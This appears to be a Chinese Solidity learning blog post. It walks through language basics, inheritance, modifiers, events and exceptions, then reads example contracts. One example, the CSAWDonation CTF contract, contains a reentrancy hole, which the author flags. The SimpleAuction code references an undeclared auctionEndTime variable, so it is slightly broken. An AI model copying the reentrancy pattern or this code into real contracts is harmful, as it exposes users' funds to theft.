&quot;&quot; int : 0 uint : 0 enum : 枚举中的第一个元素 address : 0x0000000000000000000000000000000000000000 (或 address(0) ) function internal : 空白方程 external : 空白方程 # 引用类型初始值 映射 mapping : 所有元素都为其默认值的 mapping 结构体 struct : 所有成员设为其默认值的结构体 数组 array 动态数组: [] 静态数组（定长）: 所有成员设为其默认值的静态数组 # delete 操作符 delete a 会让变量 a 的值变为初始值。 //delete 操作符 bool public _bool2 = true; function d() external &#123; delete _bool2; //delete 会让_bool2 变为默认值，false &#125;# solidity 的常数 solidity 中两个关键字， constant （常量）和 immutable （不变量）都可以用来表示常数，状态变量声明这个两个关键字之后，不能在合约后更改数值；并且还可以节省 gas . 另外，只有数值变量可以声明 constant 和 immutable ； string 和 bytes 可以声明为 constant ，但不能为 immutable 。 # constant constant 变量必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过。 //constant 变量必须在声明的时候初始化，之后不能改变 uint256 constant CONSTANT_NUM = 10; string constant CONSTANT_STRING = \"0xAA\"; bytes constant CONSTANT_BYTES = \"WTF\"; address constant CONSTANT_ADDRESS = 0x0000000000000000000000000000000000000000;# immutable immutable 变量可以在声明时或构造函数中初始化，因此更加灵活。 //immutable 变量可以在 constructor 里初始化，之后不能改变 uint256 public immutable IMMUTABLE_NUM = 9999999999; address public immutable IMMUTABLE_ADDRESS; uint256 public immutable IMMUTABLE_BLOCK; uint256 public immutable IMMUTABLE_TEST;你可以使用全局变量例如 address(this) ， block.number ，或者自定义的函数给 immutable 变量初始化。在下面这个例子，我们利用了 test() 函数给 IMMUTABLE_TEST 初始化为 9 ： // 利用 constructor 初始化 immutable 变量，因此可以利用 constructor()&#123; IMMUTABLE_ADDRESS = address(this); IMMUTABLE_BLOCK = block.number; IMMUTABLE_TEST = test(); &#125; function test() public pure returns(uint256)&#123; uint256 what = 9; return(what); &#125;# solidity 的控制流 简单看了看，完全可以将 solidity 的控制流和 c 语言类比，因为逻辑基本上是一样的 if-else function ifElseTest(uint256 _number) public pure returns(bool)&#123; if(_number == 0)&#123; return(true); &#125;else&#123; return(false); &#125;&#125; for循环 function forLoopTest() public pure returns(uint256)&#123; uint sum = 0; for(uint i = 0; i &lt; 10; i++)&#123; sum += i; &#125; return(sum);&#125; while循环 function whileTest() public pure returns(uint256)&#123; uint sum = 0; uint i = 0; while(i &lt; 10)&#123; sum += i; i++; &#125; return(sum);&#125; do-while循环 function doWhileTest() public pure returns(uint256)&#123; uint sum = 0; uint i = 0; do&#123; sum += i; i++; &#125;while(i &lt; 10); return(sum);&#125; 三元运算符 三元运算符是 solidity 中唯一一个接受三个操作数的运算符，规则 条件? 条件为真的表达式:条件为假的表达式 。 此运算符经常用作 if 语句的快捷方式。 // 三元运算符 ternary/conditional operatorfunction ternaryTest(uint256 x, uint256 y) public pure returns(uint256)&#123;// return the max of x and y return x >= y ? x: y;&#125;另外还有 continue （立即进入下一个循环）和 break （跳出当前循环）关键字可以使用。 # solidity 的构造函数与修饰器 # 构造函数 构造函数（ constructor ）是一种特殊的函数，每个合约可以定义一个，并在部署合约的时候自动运行一次。它可以用来初始化合约的一些参数，例如初始化合约的 owner 地址： address owner; // 定义 owner 变量 // 构造函数 constructor() &#123; owner = msg.sender; // 在部署合约的时候，将 owner 设置为部署者的地址 &#125;# 修饰器 修饰器（ modifier ）是 solidity 特有的语法，类似于面向对象编程中的 decorator ，声明函数拥有的特性，并减少代码冗余。它就像钢铁侠的智能盔甲，穿上它的函数会带有某些特定的行为。 modifier 的主要使用场景是运行函数前的检查，例如地址，变量，余额等。 我们来定义一个叫做 onlyOwner 的 modifier： // 定义 modifier modifier onlyOwner &#123; require(msg.sender == owner);// 检查调用者是否为 owner 地址 _;// 如果是的话，继续运行函数主体；否则报错并 revert 交易 &#125;代有 onlyOwner 修饰符的函数只能被 owner 地址调用，比如下面这个例子： function changeOwner(address _newOwner) external onlyOwner&#123; owner = _newOwner;// 只有 owner 地址运行这个函数，并改变 owner &#125;我们定义了一个 changeOwner 函数，运行他可以改变合约的 owner ，但是由于 onlyOwner 修饰符的存在，只有原先的 owner 可以调用，别人调用就会报错。这也是最常用的控制智能合约权限的方法。 # solidity 的事件 事件是使用 EVM 日志内置功能的方便工具，在 dapp 的接口中，它可以反过来调用 Javascript 的监听 事件的回调。 Solidity 中的事件（ event ）是 EVM 上日志的抽象，它具有两个特点： 响应：应用程序（ [ether.js](https://learnblockchain.cn/docs/ethers.js/api-contract.html#id18) ）可以通过 RPC 接口订阅和监听这些事件，并在前端做响应。 经济：事件是 EVM 上比较经济的存储数据的方式，每个大概消耗 2,000 gas ；相比之下，链上存储一个新变量至少需要 20,000 gas 。 # 规则 事件的声明由 event 关键字开头，然后跟事件名称，括号里面写好事件需要记录的变量类型和变量名。以 ERC20 代币合约的 Transfer 事件为例： event Transfer(address indexed from, address indexed to, uint256 value);我们可以看到， Transfer 事件共记录了 3 个变量 from ， to 和 value ，分别对应代币的转账地址，接收地址和转账数量。 同时 from 和 to 前面带着 indexed 关键字，每个 indexed 标记的变量可以理解为检索事件的索引 “键”，在以太坊上单独作为一个 topic 进行存储和索引，程序可以轻松的筛选出特定转账地址和接收地址的转账事件。每个事件最多有 3 个带 indexed 的变量。每个 indexed 变量的大小为固定的 256 比特。事件的哈希以及这三个带 indexed 的变量在 EVM 日志中通常被存储为 topic 。其中 topic[0] 是此事件的 keccak256 哈希， topic[1] 到 topic[3] 存储了带 indexed 变量的 keccak256 哈希。 value 不带 indexed 关键字，会存储在事件的 data 部分中，可以理解为事件的 “值”。 data 部分的变量不能被直接检索，但可以存储任意大小的数据。因此一般 data 部分可以用来存储复杂的数据结构，例如数组和字符串等等，因为这些数据超过了 256 比特，即使存储在事件的 topic 部分中，也是以哈希的方式存储。另外， data 部分的变量在存储上消耗的 gas 相比于 topic 更少。 我们可以在函数里释放事件。在下面的例子中，每次用 _transfer() 函数进行转账操作的时候，都会释放 Transfer 事件，并记录相应的变量。 // 定义_transfer 函数，执行转账逻辑 function _transfer( address from, address to, uint256 amount ) external &#123; _balances[from] = 10000000; // 给转账地址一些初始代币 _balances[from] -= amount; //from 地址减去转账数量 _balances[to] += amount; //to 地址加上转账数量 // 释放事件 emit Transfer(from, to, amount); &#125;# solidity 中的继承 # 继承 继承是面向对象编程很重要的组成部分，可以显著减少重复代码。如果把合约看作是对象的话， solidity 也是面向对象的编程，也支持继承。 # 规则 virtual : 父合约中的函数，如果希望子合约重写，需要加上 virtual 关键字。 override ：子合约重写了父合约中的函数，需要加上 override 关键字。 # 简单继承 我们先写一个简单的爷爷合约 Yeye ，里面包含 1 个 Log 事件和 3 个 function : hip() , pop() , yeye() ，输出都是”Yeye”。 contract Yeye &#123; event Log(string msg);// 定义 3 个 function: hip (), pop (), man ()，Log 值为 Yeye。 function hip() public virtual&#123; emit Log(\"Yeye\"); &#125; function pop() public virtual&#123; emit Log(\"Yeye\"); &#125; function yeye() public virtual &#123; emit Log(\"Yeye\"); &#125;&#125;我们再定义一个爸爸合约 Baba ，让他继承 Yeye 合约，语法就是 contract Baba is Yeye ，非常直观。在 Baba 合约里，我们重写一下 hip() 和 pop() 这两个函数，加上 override 关键字，并将他们的输出改为 ”Baba” ；并且加一个新的函数 baba ，输出也是 ”Baba” 。 contract Baba is Yeye&#123;// 继承两个 function: hip () 和 pop ()，输出改为 Baba。 function hip() public virtual override&#123; emit Log(\"Baba\"); &#125; function pop() public virtual override&#123; emit Log(\"Baba\"); &#125; function baba() public virtual&#123; emit Log(\"Baba\"); &#125;&#125;我们部署合约，可以看到 Baba 合约里有 4 个函数，其中 hip() 和 pop() 的输出被成功改写成 ”Baba” ，而继承来的 yeye() 的输出仍然是 ”Yeye” 。 # 多重继承 solidity 的合约可以继承多个合约。规则： 继承时要按辈分最高到最低的顺序排。比如我们写一个 Erzi 合约，继承 Yeye 合约和 Baba 合约，那么就要写成 contract Erzi is Yeye, Baba ，而不能写成 contract Erzi is Baba, Yeye ，不然就会报错。 如果某一个函数在多个继承的合约里都存在，比如例子中的 hip() 和 pop() ，在子合约里必须重写，不然会报错。 重写在多个父合约中都重名的函数时， override 关键字后面要加上所有父合约名字，例如 override(Yeye, Baba) 。 例子： contract Erzi is Yeye, Baba&#123;// 继承两个 function: hip () 和 pop ()，输出值为 Erzi。 function hip() public virtual override(Yeye, Baba)&#123; emit Log(\"Erzi\"); &#125; function pop() public virtual override(Yeye, Baba) &#123; emit Log(\"Erzi\"); &#125;我们可以看到， Erzi 合约里面重写了 hip() 和 pop() 两个函数，将输出改为 ”Erzi” ，并且还分别从 Yeye 和 Baba 合约继承了 yeye() 和 baba() 两个函数。 # 修饰器的继承 Solidity 中的修饰器（ Modifier ）同样可以继承，用法与函数继承类似，在相应的地方加 virtual 和 override 关键字即可。 contract Base1 &#123; modifier exactDividedBy2And3(uint _a) virtual &#123; require(_a % 2 == 0 &amp;&amp; _a % 3 == 0); _; &#125;&#125;contract Identifier is Base1 &#123;// 计算一个数分别被 2 除和被 3 除的值，但是传入的参数必须是 2 和 3 的倍数 function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) &#123; return getExactDividedBy2And3WithoutModifier(_dividend); &#125;// 计算一个数分别被 2 除和被 3 除的值 function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint)&#123; uint div2 = _dividend / 2; uint div3 = _dividend / 3; return (div2, div3); &#125;&#125;Identifier 合约可以直接在代码中使用父合约中的 exactDividedBy2And3 修饰器，也可以利用 override 关键字重写修饰器： modifier exactDividedBy2And3(uint _a) override &#123; _; require(_a % 2 == 0 &amp;&amp; _a % 3 == 0); &#125;# 构造函数的继承 子合约有两种方法继承父合约的构造函数。举个简单的例子，父合约 A 里面有一个状态变量 a ，并由构造函数的参数来确定： // 构造函数的继承abstract contract A &#123; uint public a; constructor(uint _a) &#123; a = _a; &#125;&#125; 在继承时声明父构造函数的参数，例如： contract B is A(1) 在子合约的构造函数中声明构造函数的参数，例如： contract C is A &#123; constructor(uint _c) A(_c * _c) &#123;&#125;&#125;# 调用父合约的函数 子合约有两种方式调用父合约的函数，直接调用和利用 super 关键字。 直接调用：子合约可以直接用 父合约名.函数名() 的方式来调用父合约函数，例如 Yeye.pop() 。 function callParent() public&#123; Yeye.pop(); &#125; super 关键字：子合约可以利用 super.函数名() 来调用最近的父合约函数。 solidity 继承关系按声明时从右到左的顺序是： contract Erzi is Yeye, Baba ，那么 Baba 是最近的父合约， super.pop() 将调用 Baba.pop() 而不是 Yeye.pop() ： function callParentSuper() public&#123; // 将调用最近的父合约函数，Baba.pop () super.pop(); &#125;# solidity 中的异常 solidity 三种抛出异常的方法： error ， require 和 assert # 条件检查 # Error error 是 solidity 0.8版本 新加的内容，方便且高效（省 gas ）地向用户解释操作失败的原因。人们可以在 contract 之外定义异常。下面，我们定义一个 TransferNotOwner 异常，当用户不是代币 owner 的时候尝试转账，会抛出错误： // Errors 用来定义失败 // 以下称为 natspec 注释，可以通过三个斜杠来识别。 // 当用户被要求确认交易时或错误发生时将显示。/// you are not the ownererror TransferNotOwner();// 自定义 error在执行当中， error 必须搭配 revert （回退）命令使用。 function transferOwner1(uint256 tokenId, address newOwner) public &#123; if(_owners[tokenId] != msg.sender)&#123; revert TransferNotOwner(); &#125; _owners[tokenId] = newOwner; &#125;我们定义了一个 transferOwner1() 函数，它会检查代币的 owner 是不是发起人，如果不是，就会抛出 TransferNotOwner 异常；如果是的话，就会转账。 # Require require 命令是 solidity 0.8版本 之前抛出异常的常用方法，目前很多主流合约仍然还在使用它。它很好用，唯一的缺点就是 gas 随着描述异常的字符串长度增加，比 error 命令要高。使用方法： require(检查条件，&quot;异常的描述&quot;) ，当检查条件不成立的时候，就会抛出异常。 我们用 require 命令重写一下上面的 transferOwner 函数： function transferOwner2(uint256 tokenId, address newOwner) public &#123; require(_owners[tokenId] == msg.sender, \"Transfer Not Owner\"); _owners[tokenId] = newOwner; &#125;# Assert assert 命令一般用于程序员写程序 debug ，因为它不能解释抛出异常的原因（比 require 少个字符串）。它的用法很简单， assert(检查条件） ，当检查条件不成立的时候，就会抛出异常。 我们用 assert 命令重写一下上面的 transferOwner 函数： function transferOwner3(uint256 tokenId, address newOwner) public &#123; assert(_owners[tokenId] == msg.sender); _owners[tokenId] = newOwner; &#125;注：同样作为判断一个条件是否满足的函数，require 会退回剩下的 gas，而 assert 会消耗所有的 gas。 # 触发异常 提供了 revert , throw 来触发异常： throw ：关键字抛出异常（从 0.4.13 版本，throw 关键字已被弃用，将来会被淘汰。）回滚所有状态改变，返回” 无效操作代码错误”，而且消耗掉剩下的 gas revert ：函数可以用来标记错误并回退当前调用，允许返回一个数值，将剩余 gas 返还调用者 传统处理异常的方式 if...throw 模式 即 等价于： if(msg.sender != owner) &#123; throw; &#125;- if(msg.sender != owner) &#123; revert(); &#125;// 如果不等则异常- assert(msg.sender == owner);// 校验是否等于- require(msg.sender == owner);# 运行第一个 solidity 代码，hello world 这里我选择在网页运行运行 solidity //SPDX-License-Identifier:GPL-3.0pragma solidity ^0.8.7;contract HelloWorldContract&#123; function helloWorld()external pure returns(string memory)&#123; return \"hello world\"; &#125;&#125; # 阅读一些智能合约 # example1.CSAWDonation /** *Submitted for verification at Etherscan.io on 2022-09-09*/// SPDX-License-Identifier: MITpragma solidity >=0.8.7;contract CSAWDonation &#123; mapping(address => uint256) public balances; mapping(address => bool) public doneDonating; event sendToAuthor(bytes32 token); function newAccount() public payable&#123; require(msg.value >= 0.0001 ether); balances[msg.sender] = 10; doneDonating[msg.sender] = false; &#125; function donateOnce() public &#123; require(balances[msg.sender] >= 1); if(doneDonating[msg.sender] == false) &#123; balances[msg.sender] += 10; msg.sender.call&#123;value: 0.0001 ether&#125;(\"\"); doneDonating[msg.sender] = true; &#125; &#125; function getBalance() public view returns (uint256 donatorBalance) &#123; return balances[msg.sender]; &#125; function getFlag(bytes32 _token) public &#123; require(balances[msg.sender] >= 30); emit sendToAuthor(_token); //sends the token &#125;&#125;这个合约是有重入漏洞的，至于什么是重入漏洞，可以参考这篇文章 智能合约安全–重入漏洞 抛开这点来说，这个合约对于像我这种 solidity 初学者来说，还是很有参考意义的. # example2. 插入排序 这里有一个错误的插入排序代码，运行后就会报错 // 插入排序 错误版 function insertionSortWrong(uint[] memory a) public pure returns(uint[] memory) &#123; for (uint i = 1;i &lt; a.length;i++)&#123; uint temp = a[i]; uint j=i-1; while( (j >= 0) &amp;&amp; (temp &lt; a[j]))&#123; a[j+1] = a[j]; j--; &#125; a[j+1] = temp; &#125; return(a); &#125;为什么呢？因为变量 j 的类型是 uint , 是不能取到 **-1 的，但是在上述代码中， j 可能会取到 - 1**, 所以要规避掉这种错误，让 j 取不到 **-1**. // 插入排序 正确版 function insertionSort(uint[] memory a) public pure returns(uint[] memory) &#123; // note that uint can not take negative value for (uint i = 1;i &lt; a.length;i++)&#123; uint temp = a[i]; uint j=i; while( (j >= 1) &amp;&amp; (temp &lt; a[j-1]))&#123; a[j] = a[j-1]; j--; &#125; a[j] = temp; &#125; return(a); &#125;# example3. 投票合约 // SPDX-License-Identifier: GPL-3.0pragma solidity >=0.7.0 &lt;0.9.0;/// @title 委托投票contract Ballot &#123; // 这里声明了一个新的复合类型用于稍后的变量 // 它用来表示一个选民 struct Voter &#123; uint weight; // 计票的权重 bool voted; // 若为真，代表该人已投票 address delegate; // 被委托人 uint vote; // 投票提案的索引 &#125; // 提案的类型 struct Proposal &#123; bytes32 name; // 简称（最长 32 个字节） uint voteCount; // 得票数 &#125; address public chairperson; // 这声明了一个状态变量，为每个可能的地址存储一个 `Voter`。 mapping(address => Voter) public voters; // 一个 `Proposal` 结构类型的动态数组 Proposal[] public proposals; /// 为 `proposalNames` 中的每个提案，创建一个新的（投票）表决 constructor(bytes32[] memory proposalNames) &#123; chairperson = msg.sender; voters[chairperson].weight = 1; // 对于提供的每个提案名称， // 创建一个新的 Proposal 对象并把它添加到数组的末尾。 for (uint i = 0; i &lt; proposalNames.length; i++) &#123; // `Proposal (&#123;...&#125;)` 创建一个临时 Proposal 对象， // `proposals.push (...)` 将其添加到 `proposals` 的末尾 proposals.push(Proposal(&#123; name: proposalNames[i], voteCount: 0 &#125;)); &#125; &#125; // 授权 `voter` 对这个（投票）表决进行投票 // 只有 `chairperson` 可以调用该函数。 function giveRightToVote(address voter) external &#123; // 若 `require` 的第一个参数的计算结果为 `false`， // 则终止执行，撤销所有对状态和以太币余额的改动。 // 在旧版的 EVM 中这曾经会消耗所有 gas，但现在不会了。 // 使用 require 来检查函数是否被正确地调用，是一个好习惯。 // 你也可以在 require 的第二个参数中提供一个对错误情况的解释。 require( msg.sender == chairperson, \"Only chairperson can give right to vote.\" ); require( !voters[voter].voted, \"The voter already voted.\" ); require(voters[voter].weight == 0); voters[voter].weight = 1; &#125; /// 把你的投票委托到投票者 `to`。 function delegate(address to) external &#123; // 传引用 Voter storage sender = voters[msg.sender]; require(sender.weight != 0, \"You have no right to vote\"); require(!sender.voted, \"You already voted.\"); require(to != msg.sender, \"Self-delegation is disallowed.\"); // 委托是可以传递的，只要被委托者 `to` 也设置了委托。 // 一般来说，这种循环委托是危险的。因为，如果传递的链条太长， // 则可能需消耗的 gas 要多于区块中剩余的（大于区块设置的 gasLimit）， // 这种情况下，委托不会被执行。 // 而在另一些情况下，如果形成闭环，则会让合约完全卡住。 while (voters[to].delegate != address(0)) &#123; to = voters[to].delegate; // 不允许闭环委托 require(to != msg.sender, \"Found loop in delegation.\"); &#125; // `sender` 是一个引用，相当于对 `voters [msg.sender].voted` 进行修改 Voter storage delegate_ = voters[to]; // Voters cannot delegate to accounts that cannot vote. require(delegate_.weight >= 1); // Since `sender` is a reference, this // modifies `voters[msg.sender]`. sender.voted = true; sender.delegate = to; if (delegate_.voted) &#123; // 若被委托者已经投过票了，直接增加得票数 proposals[delegate_.vote].voteCount += sender.weight; &#125; else &#123; // 若被委托者还没投票，增加委托者的权重 delegate_.weight += sender.weight; &#125; &#125; /// 把你的票 (包括委托给你的票)， /// 投给提案 `proposals [proposal].name`. function vote(uint proposal) external &#123; Voter storage sender = voters[msg.sender]; require(!sender.voted, \"Already voted.\"); sender.voted = true; sender.vote = proposal; // 如果 `proposal` 超过了数组的范围，则会自动抛出异常，并恢复所有的改动 proposals[proposal].voteCount += sender.weight; &#125; /// @dev 结合之前所有的投票，计算出最终胜出的提案 function winningProposal() external view returns (uint winningProposal_) &#123; uint winningVoteCount = 0; for (uint p = 0; p &lt; proposals.length; p++) &#123; if (proposals[p].voteCount > winningVoteCount) &#123; winningVoteCount = proposals[p].voteCount; winningProposal_ = p; &#125; &#125; &#125; // 调用 winningProposal () 函数以获取提案数组中获胜者的索引，并以此返回获胜者的名称 function winnerName() public view returns (bytes32 winnerName_) &#123; winnerName_ = proposals[winningProposal()].name; &#125;&#125;# example4. 简单的公开拍卖 // SPDX-License-Identifier: GPL-3.0pragma solidity ^0.8.4;contract SimpleAuction &#123; // 拍卖的参数。 address payable public beneficiary; // 时间是 unix 的绝对时间戳（自 1970-01-01 以来的秒数） // 或以秒为单位的时间段。 uint public auctionEnd; // 拍卖的当前状态 address public highestBidder; uint public highestBid; // 可以取回的之前的出价 mapping(address => uint) pendingReturns; // 拍卖结束后设为 true，将禁止所有的变更 bool ended; // 变更触发的事件 event HighestBidIncreased(address bidder, uint amount); event AuctionEnded(address winner, uint amount); // Errors 用来定义失败 // 以下称为 natspec 注释，可以通过三个斜杠来识别。 // 当用户被要求确认交易时或错误发生时将显示。 /// The auction has already ended. error AuctionAlreadyEnded(); /// There is already a higher or equal bid. error BidNotHighEnough(uint highestBid); /// The auction has not ended yet. error AuctionNotYetEnded(); /// The function auctionEnd has already been called. error AuctionEndAlreadyCalled(); /// 以受益者地址 `beneficiaryAddress` 的名义， /// 创建一个简单的拍卖，拍卖时间为 `biddingTime` 秒。 constructor( uint biddingTime, address payable beneficiaryAddress ) &#123; beneficiary = beneficiaryAddress; auctionEnd = block.timestamp + biddingTime; &#125; /// 对拍卖进行出价，具体的出价随交易一起发送。 /// 如果没有在拍卖中胜出，则返还出价。 function bid() external payable &#123; // 参数不是必要的。因为所有的信息已经包含在了交易中。 // 对于能接收以太币的函数，关键字 payable 是必须的。 // 如果拍卖已结束，撤销函数的调用。 if (block.timestamp > auctionEndTime) revert AuctionAlreadyEnded(); // 如果出价不够高，返还你的钱 if (msg.value &lt;= highestBid) revert BidNotHighEnough(highestBid); if (highestBid != 0) &#123; // 返还出价时，简单地直接调用 highestBidder.send (highestBid) 函数， // 是有安全风险的，因为它有可能执行一个非信任合约。 // 更为安全的做法是让接收方自己提取金钱。 pendingReturns[highestBidder] += highestBid; &#125; highestBidder = msg.sender; highestBid = msg.value; emit HighestBidIncreased(msg.sender, msg.value); &#125; /// 取回出价（当该出价已被超越） function withdraw() external returns (bool) &#123; uint amount = pendingReturns[msg.sender]; if (amount > 0) &#123; // 这里很重要，首先要设零值。 // 因为，作为接收调用的一部分， // 接收者可以在 `send` 返回之前，重新调用该函数。 pendingReturns[msg.sender] = 0; // msg.sender is not of type `address payable` and must be // explicitly converted using `payable(msg.sender)` in order // use the member function `send()`. if (!payable(msg.sender).send(amount)) &#123; // 这里不需抛出异常，只需重置未付款 pendingReturns[msg.sender] = amount; return false; &#125; &#125; return true; &#125; /// 结束拍卖，并把最高的出价发送给受益人 function auctionEnd() external &#123; // 对于可与其他合约交互的函数（意味着它会调用其他函数或发送以太币）， // 一个好的指导方针是将其结构分为三个阶段： // 1. 检查条件 // 2. 执行动作 (可能会改变条件) // 3. 与其他合约交互 // 如果这些阶段相混合，其他的合约可能会回调当前合约并修改状态， // 或者导致某些效果（比如支付以太币）多次生效。 // 如果合约内调用的函数包含了与外部合约的交互， // 则它也会被认为是与外部合约有交互的。 // 1. 条件 if (block.timestamp &lt; auctionEndTime) revert AuctionNotYetEnded(); if (ended) revert AuctionEndAlreadyCalled(); // 2. 生效 ended = true; emit AuctionEnded(highestBidder, highestBid); // 3. 交互 beneficiary.transfer(highestBid); &#125;&#125;# 参考资料 Solidity 中文文档 - Solidity 中文文档 - 登链社区","categories":[],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://oacia.dev/tags/solidity/"}]},{"title":"第一个blog纪念!","slug":"第一个blog纪念!","date":"2022-09-27T16:00:00.000Z","updated":"2025-04-08T18:55:12.215Z","comments":true,"path":"第一个blog纪念!/","link":"","permalink":"https://oacia.dev/%E7%AC%AC%E4%B8%80%E4%B8%AAblog%E7%BA%AA%E5%BF%B5!/","excerpt":"","text":"# 仅以此纪念 oacia 的 blog 在 2022/9/28 正式建成！","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"ollvm","slug":"ollvm","permalink":"https://oacia.dev/tags/ollvm/"},{"name":"android","slug":"android","permalink":"https://oacia.dev/tags/android/"},{"name":"idapython","slug":"idapython","permalink":"https://oacia.dev/tags/idapython/"},{"name":"rwProcMem33","slug":"rwProcMem33","permalink":"https://oacia.dev/tags/rwProcMem33/"},{"name":"android kernel","slug":"android-kernel","permalink":"https://oacia.dev/tags/android-kernel/"},{"name":"root","slug":"root","permalink":"https://oacia.dev/tags/root/"},{"name":"pixel3","slug":"pixel3","permalink":"https://oacia.dev/tags/pixel3/"},{"name":"ctf","slug":"ctf","permalink":"https://oacia.dev/tags/ctf/"},{"name":"go","slug":"go","permalink":"https://oacia.dev/tags/go/"},{"name":"powershell混淆","slug":"powershell混淆","permalink":"https://oacia.dev/tags/powershell%E6%B7%B7%E6%B7%86/"},{"name":"rust","slug":"rust","permalink":"https://oacia.dev/tags/rust/"},{"name":"python","slug":"python","permalink":"https://oacia.dev/tags/python/"},{"name":"CTF","slug":"CTF","permalink":"https://oacia.dev/tags/CTF/"},{"name":"逆向","slug":"逆向","permalink":"https://oacia.dev/tags/%E9%80%86%E5%90%91/"},{"name":"易语言","slug":"易语言","permalink":"https://oacia.dev/tags/%E6%98%93%E8%AF%AD%E8%A8%80/"},{"name":"inline hook","slug":"inline-hook","permalink":"https://oacia.dev/tags/inline-hook/"},{"name":"IsDebuggerPresent","slug":"IsDebuggerPresent","permalink":"https://oacia.dev/tags/IsDebuggerPresent/"},{"name":"sleep反调试","slug":"sleep反调试","permalink":"https://oacia.dev/tags/sleep%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"python逆向","slug":"python逆向","permalink":"https://oacia.dev/tags/python%E9%80%86%E5%90%91/"},{"name":"go逆向","slug":"go逆向","permalink":"https://oacia.dev/tags/go%E9%80%86%E5%90%91/"},{"name":"进程通信","slug":"进程通信","permalink":"https://oacia.dev/tags/%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/"},{"name":"信号量","slug":"信号量","permalink":"https://oacia.dev/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/"},{"name":"消息队列","slug":"消息队列","permalink":"https://oacia.dev/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"},{"name":"管道","slug":"管道","permalink":"https://oacia.dev/tags/%E7%AE%A1%E9%81%93/"},{"name":"共享内存","slug":"共享内存","permalink":"https://oacia.dev/tags/%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98/"},{"name":"frida","slug":"frida","permalink":"https://oacia.dev/tags/frida/"},{"name":"安卓逆向","slug":"安卓逆向","permalink":"https://oacia.dev/tags/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"},{"name":"平板刷机","slug":"平板刷机","permalink":"https://oacia.dev/tags/%E5%B9%B3%E6%9D%BF%E5%88%B7%E6%9C%BA/"},{"name":"BL锁","slug":"BL锁","permalink":"https://oacia.dev/tags/BL%E9%94%81/"},{"name":"magisk","slug":"magisk","permalink":"https://oacia.dev/tags/magisk/"},{"name":"odin3","slug":"odin3","permalink":"https://oacia.dev/tags/odin3/"},{"name":"安卓静态插桩","slug":"安卓静态插桩","permalink":"https://oacia.dev/tags/%E5%AE%89%E5%8D%93%E9%9D%99%E6%80%81%E6%8F%92%E6%A1%A9/"},{"name":"smali","slug":"smali","permalink":"https://oacia.dev/tags/smali/"},{"name":"智能合约","slug":"智能合约","permalink":"https://oacia.dev/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"区块链","slug":"区块链","permalink":"https://oacia.dev/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"solidity","slug":"solidity","permalink":"https://oacia.dev/tags/solidity/"},{"name":"批量编译","slug":"批量编译","permalink":"https://oacia.dev/tags/%E6%89%B9%E9%87%8F%E7%BC%96%E8%AF%91/"},{"name":"提取公开库","slug":"提取公开库","permalink":"https://oacia.dev/tags/%E6%8F%90%E5%8F%96%E5%85%AC%E5%BC%80%E5%BA%93/"},{"name":"pyinstaller","slug":"pyinstaller","permalink":"https://oacia.dev/tags/pyinstaller/"},{"name":"uncompyle6","slug":"uncompyle6","permalink":"https://oacia.dev/tags/uncompyle6/"},{"name":"pycdc","slug":"pycdc","permalink":"https://oacia.dev/tags/pycdc/"},{"name":"web3","slug":"web3","permalink":"https://oacia.dev/tags/web3/"},{"name":"算法","slug":"算法","permalink":"https://oacia.dev/tags/%E7%AE%97%E6%B3%95/"},{"name":"柚鸟夏","slug":"柚鸟夏","permalink":"https://oacia.dev/tags/%E6%9F%9A%E9%B8%9F%E5%A4%8F/"},{"name":"C语言","slug":"C语言","permalink":"https://oacia.dev/tags/C%E8%AF%AD%E8%A8%80/"},{"name":"交叉编译","slug":"交叉编译","permalink":"https://oacia.dev/tags/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/"}]}